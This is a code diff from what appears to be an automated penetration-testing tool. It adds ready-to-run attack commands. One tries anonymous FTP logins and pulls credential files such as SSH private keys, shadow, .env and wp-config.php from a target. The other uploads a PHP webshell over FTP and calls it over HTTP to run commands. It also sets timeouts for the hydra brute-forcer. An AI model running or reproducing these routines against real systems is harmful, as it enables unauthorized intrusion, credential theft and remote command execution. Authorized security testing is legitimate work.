@@ -275,6 +275,63 @@ const TOOL_COMMANDS: Record<string, (target: string, opts: ToolOptions) => strin
     return ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'ConnectTimeout=10', '-p', String(port), `${user}@${host}`, enumCmd];
   },
 
+  ftp_browse: (target, opts) => {
+    const host = extractHost(target);
+    const port = opts.port ?? 21;
+    const user = opts.username ?? 'anonymous';
+    const pass = opts.password ?? 'anonymous@';
+    // List root dir, then list common subdirs, then try to download interesting files
+    const commands = [
+      `echo "=== FTP ROOT LISTING ==="`,
+      `curl -s --list-only --max-time 15 "ftp://${user}:${pass}@${host}:${port}/" 2>&1 || echo "FTP_ROOT_FAILED"`,
+      `echo "=== FTP RECURSIVE LISTING ==="`,
+      // Try common writable dirs
+      `for dir in uploads upload files public www html data backup tmp; do echo "--- /$dir/ ---"; curl -s --list-only --max-time 10 "ftp://${user}:${pass}@${host}:${port}/$dir/" 2>&1; done`,
+      `echo "=== FTP INTERESTING FILES ==="`,
+      // Try to download common config/key files
+      `for f in .env .htaccess id_rsa id_ed25519 authorized_keys shadow passwd config.php wp-config.php database.yml .git/config; do echo "--- $f ---"; curl -s --max-time 10 "ftp://${user}:${pass}@${host}:${port}/$f" 2>&1 | head -50; done`,
+      `echo "=== FTP WRITE TEST ==="`,
+      // Test if root is writable
+      `echo "FTP_WRITE_TEST" | curl -s -T - --max-time 10 "ftp://${user}:${pass}@${host}:${port}/.ftp_test" 2>&1 && echo "ROOT_WRITABLE" && curl -s --max-time 5 -X "DELE .ftp_test" "ftp://${user}:${pass}@${host}:${port}/" 2>/dev/null`,
+      // Test uploads dir
+      `echo "FTP_WRITE_TEST" | curl -s -T - --max-time 10 "ftp://${user}:${pass}@${host}:${port}/uploads/.ftp_test" 2>&1 && echo "UPLOADS_WRITABLE" && curl -s --max-time 5 -X "DELE uploads/.ftp_test" "ftp://${user}:${pass}@${host}:${port}/" 2>/dev/null`,
+      `echo "=== FTP BROWSE COMPLETE ==="`,
+    ];
+    return ['sh', '-c', commands.join(' && ')];
+  },
+
+  ftp_upload: (target, opts) => {
+    const host = extractHost(target);
+    const port = opts.port ?? 21;
+    const user = opts.username ?? 'anonymous';
+    const pass = opts.password ?? 'anonymous@';
+    const filename = opts.filename ?? 'shell.php';
+    const shellContent = opts.shellContent ?? '<?php echo "WEBSHELL_ACTIVE"; system($_GET["cmd"]); ?>';
+    const uploadDir = opts.extra ?? 'uploads';
+    // Upload webshell via FTP, then try to access it via HTTP
+    const httpPort = opts.lport ?? '80';
+    const commands = [
+      `echo "=== FTP UPLOAD ==="`,
+      // Write shell to temp file
+      `printf '%s' '${shellContent.replace(/'/g, "'\\''")}' > /tmp/${filename}`,
+      // Upload via FTP
+      `curl -s -T /tmp/${filename} --max-time 15 "ftp://${user}:${pass}@${host}:${port}/${uploadDir}/${filename}" 2>&1`,
+      `echo "FTP_UPLOAD_COMPLETE: ${uploadDir}/${filename}"`,
+      // Verify via FTP listing
+      `echo "=== FTP VERIFY ==="`,
+      `curl -s --list-only --max-time 10 "ftp://${user}:${pass}@${host}:${port}/${uploadDir}/" 2>&1`,
+      // Try to access via HTTP (webshell cross-service attack)
+      `echo "=== HTTP VERIFY ==="`,
+      `curl -s --max-time 10 "http://${host}:${httpPort}/${uploadDir}/${filename}?cmd=id" 2>&1`,
+      `curl -s --max-time 10 "http://${host}:${httpPort}/${filename}?cmd=id" 2>&1`,
+      // Also try common web roots that may map to FTP
+      `curl -s --max-time 10 "http://${host}:${httpPort}/ftp/${uploadDir}/${filename}?cmd=id" 2>&1`,
+      `echo "=== UPLOAD COMPLETE ==="`,
+      `rm -f /tmp/${filename}`,
+    ];
+    return ['sh', '-c', commands.join(' && ')];
+  },
+
   webshell_upload: (target, opts) => {
     const uploadUrl = opts.uploadUrl ?? `${target}/upload.php`;
     const shellContent = opts.shellContent ?? '<?php system($_GET["cmd"]); ?>';
@@ -386,6 +443,9 @@ class ToolExecutor {
     metasploit: 600_000,   // 10 min — MSF loads slowly + multiple modules
     msf_exploit: 600_000,  // 10 min — MSF exploit execution
     zap: 600_000,          // 10 min — spider + active scan
+    hydra: 600_000,        // 10 min — larger wordlists need more time
+    ftp_browse: 120_000,   // 2 min — multiple FTP operations
+    ftp_upload: 120_000,   // 2 min — upload + HTTP verify
     traceroute: 60_000,   // 1 min
     searchsploit: 60_000,  // 1 min
     ssh_connect: 60_000,   // 1 min — single SSH command
